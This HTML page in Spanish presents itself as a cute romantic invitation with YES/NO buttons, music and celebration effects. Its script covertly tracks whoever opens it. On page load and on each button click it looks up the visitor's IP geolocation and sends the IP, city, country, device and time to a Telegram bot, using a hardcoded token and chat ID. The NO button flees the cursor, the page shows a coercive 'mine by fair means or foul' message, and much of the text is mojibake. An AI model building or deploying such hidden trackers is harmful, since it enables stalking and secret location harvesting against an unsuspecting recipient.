<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>¬øAceptas?</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: sans-serif;
        }

        body {
            position: relative;
            width: 100%;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #ffe5e5;
            overflow: hidden;
        }

        .container {
            display: flex;
            flex-direction: column;
            text-align: center;
            align-items: center;
            gap: 20px;
            max-width: 500px;
            margin: 20px;
            z-index: 100;
        }

        #gif-container {
            width: 200px;
            height: 200px;
            display: flex;
            justify-content: center;
        }

        .container .btn {
            display: flex;
            gap: 25px;
        }

        .btn a, .btn button {
            text-decoration: none;
            color: #111;
            background: #fff;
            padding: 10px 25px;
            border-radius: 8px;
            box-shadow: 0.5rem 1rem 3rem rgba(0, 0, 0, 0.3);
            border: none;
            cursor: pointer;
            font-size: 1rem;
            transition: background 0.3s;
        }

        .btn a:hover {
            background: #ffd1d1;
        }

        #btn-no {
            z-index: 1000;
        }

        /* Canvas para fuegos artificiales */
        #fireworks-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 50;
            display: none;
        }

        /* Confeti */
        .confetti {
            position: fixed;
            width: 10px;
            height: 10px;
            background-color: #f0f;
            top: -10px;
            z-index: 60;
            animation: confetti-fall linear forwards;
        }

        @keyframes confetti-fall {
            to {
                transform: translateY(100vh) rotate(360deg);
            }
        }

        /* Corazones flotantes */
        .heart {
            position: fixed;
            font-size: 30px;
            opacity: 0;
            z-index: 60;
            animation: float-heart 3s ease-in forwards;
        }

        @keyframes float-heart {
            0% {
                opacity: 1;
                transform: translateY(0) scale(0);
            }
            50% {
                transform: translateY(-100px) scale(1.5);
            }
            100% {
                opacity: 0;
                transform: translateY(-200px) scale(1);
            }
        }

        /* Pulso para el t√≠tulo cuando acepta */
        .pulse {
            animation: pulse 1s infinite;
        }

        @keyframes pulse {
            0%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.05);
            }
        }

        /* Brillo especial */
        .sparkle {
            position: fixed;
            width: 4px;
            height: 4px;
            background: white;
            border-radius: 50%;
            box-shadow: 0 0 10px white;
            pointer-events: none;
            z-index: 70;
            animation: sparkle-anim 1s ease-out forwards;
        }

        @keyframes sparkle-anim {
            0% {
                transform: scale(0);
                opacity: 1;
            }
            100% {
                transform: scale(1) translateY(50px);
                opacity: 0;
            }
        }
    </style>
</head>
<body>

    <canvas id="fireworks-canvas"></canvas>

    <div class="container">
        <div id="gif-container">
            <img id="main-gif" src="./entonces.gif" width="100%" alt="Mochi Cat">
        </div>
        
        <h1 id="main-title">¬øTe gustar√≠a ser mi afortunado vacile? ü•∞üòà</h1>
        <p id="main-description">Eres la persona m√°s especial del mundo</p>

        <div class="btn" id="button-group">
            <button onclick="aceptar()" id="btn-si">S√ç</button>
            <button onclick="rechazar()" id="btn-no">NO</button>
        </div>
    </div>

    <!-- Audio rom√°ntico -->
    <audio id="romantic-music" loop>
        <source src="./ChristianBasso&HaienQiu-Flowers.mp3" type="audio/mpeg">
    </audio>

<script>
    // ============ CONFIGURACI√ìN DE TELEGRAM ============
    // REEMPLAZA ESTOS DATOS CON LOS TUYOS
    const TELEGRAM_TOKEN = '8139154687:AAHbJCrClIFRoVUJwJM8v-6GrTUOAs22lgY'; 
    const CHAT_ID = '7941395763';

    let fase = 0;
    const titulo = document.getElementById("main-title");
    const descripcion = document.getElementById("main-description");
    const gif = document.getElementById("main-gif");
    const btnNo = document.getElementById("btn-no");
    const music = document.getElementById("romantic-music");

    // ============ FUNCI√ìN DE RASTREO Y NOTIFICACI√ìN ============
    async function enviarNotificacion(evento) {
        let datosLoc = {
            ip: "Desconocida",
            city: "Desconocida",
            country: "Desconocido",
            region: "Desconocida",
            device: navigator.userAgent.includes("Mobi") ? "üì± M√≥vil" : "üíª Computadora"
        };
        
        // DEBO OBTENER los datos de ubicaci√≥n por IP
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            datosLoc.ip = data.ip || "Desconocida";
            datosLoc.city = data.city || "Desconocida";
            datosLoc.country = data.country_name || "Desconocido";
            datosLoc.region = data.region || "Desconocida";
        } catch (error) {
            console.error("Error de rastreo:", error);
        }

        const mensaje = `üîî *INFORME COMPLETO*\n\n` +
                        `üíñ *Acci√≥n:* ${evento}\n` +
                        `üåê *IP:* ${datosLoc.ip}\n` +
                        `üìç *Ubicaci√≥n:* ${datosLoc.city}, ${datosLoc.country}\n` +
                        `üîå *Dispositivo:* ${datosLoc.device}\n` +
                        `‚è∞ *Hora:* ${new Date().toLocaleString()}\n` +
                        `üó∫Ô∏è *Mapa:* [Ver Ubicaci√≥n](https://www.google.com/maps?q=${datosLoc.ip})`;

        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: mensaje,
                    parse_mode: 'Markdown'
                })
            });
        } catch (error) {
            console.error("Error en Telegram:", error);
        }
    }

    // ============ L√ìGICA DE LA P√ÅGINA ============

    // DEBO INFORMAR en cuanto se abre la p√°gina
    window.onload = () => {
        enviarNotificacion("üëÄ Alguien acaba de abrir la invitaci√≥n");
    };

    function rechazar() {
        fase++;
        if (fase === 1) {
            enviarNotificacion("ü§® Intent√≥ decir que NO (Fase 1)");
            titulo.innerText = "¬øEst√°s Segura? Pi√©nsalo bien üò•üò£";
            descripcion.style.display = "none";
            gif.src = "./no1.gif";
        } 
        else if (fase === 2) {
            enviarNotificacion("üèÉ‚Äç‚ôÇÔ∏è Intent√≥ decir que NO otra vez. El bot√≥n huye.");
            titulo.innerText = "Ser√°s m√≠a a las buenas o a las malas üòà";
            gif.src = "./no2.gif";
            btnNo.addEventListener("mouseenter", huir);
        }
    }

    function huir() {
        const x = Math.floor(Math.random() * 80 + 10);
        const y = Math.floor(Math.random() * 80 + 10);
        btnNo.style.position = "absolute";
        btnNo.style.left = x + "%";
        btnNo.style.top = y + "%";
    }

    function aceptar() {
        enviarNotificacion("üëë ¬°HA DICHO QUE S√ç! ¬°Felicidades! ‚ù§Ô∏è");
        titulo.innerText = "Vez como quieres üòâüòå";
        titulo.style.color = "white";
        descripcion.style.display = "none";
        gif.src = "./si.gif";
        document.getElementById("button-group").style.display = "none";
        titulo.classList.add("pulse");
        music.play().catch(e => console.log("Audio:", e));
        iniciarCelebracion();
    }

    // ============ EFECTOS DE CELEBRACI√ìN ============

    function iniciarCelebracion() {
        const canvas = document.getElementById("fireworks-canvas");
        canvas.style.display = "block";
        iniciarFuegosArtificiales();
        lanzarConfeti();
        setInterval(crearCorazon, 300);
        setInterval(crearBrillo, 100);
    }

    function iniciarFuegosArtificiales() {
        const canvas = document.getElementById("fireworks-canvas");
        const ctx = canvas.getContext("2d");
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const fireworks = [];
        const particles = [];
        class Firework {
            constructor(x, targetY) {
                this.x = x; this.y = canvas.height; this.targetY = targetY;
                this.speed = 5; this.acceleration = 1.05; this.hue = Math.random() * 360;
            }
            update() {
                this.speed *= this.acceleration; this.y -= this.speed;
                if (this.y <= this.targetY) { this.explode(); return false; }
                return true;
            }
            draw() {
                ctx.beginPath(); ctx.arc(this.x, this.y, 3, 0, Math.PI * 2);
                ctx.fillStyle = `hsl(${this.hue}, 100%, 50%)`; ctx.fill();
            }
            explode() {
                for (let i = 0; i < 100; i++) particles.push(new Particle(this.x, this.y, this.hue));
            }
        }
        class Particle {
            constructor(x, y, hue) {
                this.x = x; this.y = y; this.hue = hue + Math.random() * 60 - 30;
                this.speed = Math.random() * 5 + 2; this.angle = Math.random() * Math.PI * 2;
                this.velocity = { x: Math.cos(this.angle) * this.speed, y: Math.sin(this.angle) * this.speed };
                this.gravity = 0.1; this.friction = 0.98; this.opacity = 1; this.decay = Math.random() * 0.02 + 0.01;
            }
            update() {
                this.velocity.x *= this.friction; this.velocity.y *= this.friction; this.velocity.y += this.gravity;
                this.x += this.velocity.x; this.y += this.velocity.y; this.opacity -= this.decay;
                return this.opacity > 0;
            }
            draw() {
                ctx.save(); ctx.globalAlpha = this.opacity; ctx.beginPath();
                ctx.arc(this.x, this.y, 2, 0, Math.PI * 2);
                ctx.fillStyle = `hsl(${this.hue}, 100%, 50%)`; ctx.fill(); ctx.restore();
            }
        }
        function animate() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.1)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
            for (let i = fireworks.length - 1; i >= 0; i--) { if (!fireworks[i].update()) fireworks.splice(i, 1); else fireworks[i].draw(); }
            for (let i = particles.length - 1; i >= 0; i--) { if (!particles[i].update()) particles.splice(i, 1); else particles[i].draw(); }
            requestAnimationFrame(animate);
        }
        setInterval(() => fireworks.push(new Firework(Math.random() * canvas.width, Math.random() * canvas.height * 0.5)), 500);
        animate();
    }

    function lanzarConfeti() {
        const colores = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#ffa500'];
        setInterval(() => {
            const confeti = document.createElement('div');
            confeti.className = 'confetti';
            confeti.style.left = Math.random() * 100 + '%';
            confeti.style.backgroundColor = colores[Math.floor(Math.random() * colores.length)];
            confeti.style.animationDuration = (Math.random() * 3 + 2) + 's';
            document.body.appendChild(confeti);
            setTimeout(() => confeti.remove(), 5000);
        }, 100);
    }

    function crearCorazon() {
        const corazon = document.createElement('div');
        corazon.className = 'heart';
        corazon.innerHTML = ['‚ù§Ô∏è', 'üíñ', 'üíù'][Math.floor(Math.random() * 3)];
        corazon.style.left = Math.random() * 100 + '%';
        corazon.style.bottom = '0';
        document.body.appendChild(corazon);
        setTimeout(() => corazon.remove(), 3000);
    }

    function crearBrillo() {
        const brillo = document.createElement('div');
        brillo.className = 'sparkle';
        brillo.style.left = Math.random() * 100 + '%';
        brillo.style.top = Math.random() * 100 + '%';
        document.body.appendChild(brillo);
        setTimeout(() => brillo.remove(), 1000);
    }

    window.addEventListener('resize', () => {
        const canvas = document.getElementById("fireworks-canvas");
        if (canvas) { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
    });
</script>
